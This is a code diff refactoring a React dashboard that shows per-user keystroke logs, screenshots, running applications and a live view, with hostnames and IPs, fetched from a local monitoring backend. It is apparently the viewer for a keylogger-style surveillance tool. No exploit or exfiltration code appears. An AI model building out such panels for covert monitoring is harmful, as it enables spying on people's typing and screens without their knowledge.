@@ -1,18 +1,20 @@
 "use client";
 
 import React, { useEffect, useState } from "react";
-import Sidebar from "@/components/Sidebar";
+
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
-import ScreenshotGallery from "@/components/ScreenshotGallery";
+import Sidebar from "@/components/Sidebar";
+import UserInfo from "@/components/UserInfo";
+import Notification from "@/components/Notification";
 import KeystrokeLogs from "@/components/KeystrokeLogs";
 import SectionButtons from "@/components/SectionButtons";
-import Notification from "@/components/Notification"; // New Notification component
+import ScreenshotGallery from "@/components/ScreenshotGallery";
 
 const Dashboard: React.FC = () => {
   const [users, setUsers] = useState<string[]>([]);
-  const [selectedUser, setSelectedUser] = useState<string | null>(null);
   const [activeUsers, setActiveUsers] = useState<string[]>([]);
+  const [selectedUser, setSelectedUser] = useState<string | null>(null);
   const [keyLogs, setKeyLogs] = useState<
     {
       timestamp: string;
@@ -25,13 +27,16 @@ const Dashboard: React.FC = () => {
   const [activeSection, setActiveSection] = useState<
     "keystrokes" | "screenshots" | "applications" | "liveview"
   >("keystrokes"); // Initialize as empty string
-  const [notifications, setNotifications] = useState<string[]>([]); // Notification state
+
+  const [notifications, setNotifications] = useState<
+    { id: number; type: "success" | "error" | "warning"; message: string }[]
+  >([]); // Notification state
 
   useEffect(() => {
     // Fetch users and active users on component mount
     const fetchUsers = async () => {
       try {
-        const response = await fetch("http://192.168.1.200:8080/get_users");
+        const response = await fetch("http://localhost:8080/get_users");
         if (response.ok) {
           const data = await response.json();
           setUsers(data.users);
@@ -46,7 +51,7 @@ const Dashboard: React.FC = () => {
     const fetchActiveUsers = async () => {
       try {
         const response = await fetch(
-          "http://192.168.1.200:8080/get_active_users"
+          "http://localhost:8080/get_active_users"
         );
         if (response.ok) {
           const data = await response.json();
@@ -59,15 +64,23 @@ const Dashboard: React.FC = () => {
             (user) => !data.active_users.includes(user)
           );
           if (onlineUsers.length) {
-            setNotifications([
-              ...notifications,
-              ...onlineUsers.map((user: any) => `${user} is now online`),
+            setNotifications((prev) => [
+              ...prev,
+              ...onlineUsers.map((user: any) => ({
+                id: Date.now() + Math.random(),
+                type: "success" as "success", // Explicitly cast the type
+                message: `${user} is now online`,
+              })),
             ]);
           }
           if (offlineUsers.length) {
-            setNotifications([
-              ...notifications,
-              ...offlineUsers.map((user) => `${user} is now offline`),
+            setNotifications((prev) => [
+              ...prev,
+              ...offlineUsers.map((user: any) => ({
+                id: Date.now() + Math.random(),
+                type: "error" as "error", // Explicitly cast the type
+                message: `${user} is now offline`,
+              })),
             ]);
           }
         } else {
@@ -80,17 +93,17 @@ const Dashboard: React.FC = () => {
 
     fetchUsers();
     fetchActiveUsers();
-    const interval = setInterval(fetchActiveUsers, 10000); // Refresh every 10 seconds
+    const interval = setInterval(fetchActiveUsers, 30000); // Refresh every 30 seconds
 
     return () => clearInterval(interval);
-  }, [activeUsers, notifications]);
+  }, [activeUsers]);
 
   useEffect(() => {
     if (selectedUser && activeSection) {
       const fetchLogs = async () => {
         try {
           const response = await fetch(
-            `http://192.168.1.200:8080/get_logs?username=${selectedUser}&type=${activeSection}`
+            `http://localhost:8080/get_logs?username=${selectedUser}&type=${activeSection}`
           );
           if (response.ok) {
             const data = await response.json();
@@ -120,6 +133,12 @@ const Dashboard: React.FC = () => {
     localStorage.setItem("selectedUser", username); // Store the selected user in local storage
   };
 
+  const handleRemoveNotification = (id: number) => {
+    setNotifications((prev) =>
+      prev.filter((notification) => notification.id !== id)
+    );
+  };
+
   return (
     <div className="flex flex-col min-h-screen bg-gray-100">
       <Header />
@@ -137,20 +156,23 @@ const Dashboard: React.FC = () => {
               handleButtonClick={handleButtonClick}
             />
 
-            <div className="border-t border-gray-300 pt-4">
+            <div className="pt-4">
               {selectedUser || activeSection ? (
                 <>
                   {selectedUser && (
-                    <div className="p-4 bg-slate-50 rounded-lg shadow-md mb-4">
-                      <h2 className="text-lg font-bold text-blue-600">
-                        {selectedUser}
-                      </h2>
-                      <p className="text-md">
-                        Hostname: {keyLogs[0]?.hostname || "N/A"}
-                      </p>
-                      <p className="text-md">
-                        IP Address: {keyLogs[0]?.ip || "N/A"}
-                      </p>
+                    <div className="pt-4">
+                      {selectedUser || activeSection ? (
+                        <UserInfo
+                          selectedUser={selectedUser}
+                          keyLogs={keyLogs}
+                        />
+                      ) : (
+                        <div className="p-4 bg-slate-50 rounded-lg shadow-md mb-4">
+                          <p className="text-md">
+                            No user selected or active section.
+                          </p>
+                        </div>
+                      )}
                     </div>
                   )}
 
@@ -173,7 +195,10 @@ const Dashboard: React.FC = () => {
           </div>
         </div>
       </main>
-      {notifications.length > 0 && <Notification messages={notifications} />}
+      <Notification
+        notifications={notifications}
+        onRemove={handleRemoveNotification}
+      />
       <Footer />
     </div>
   );
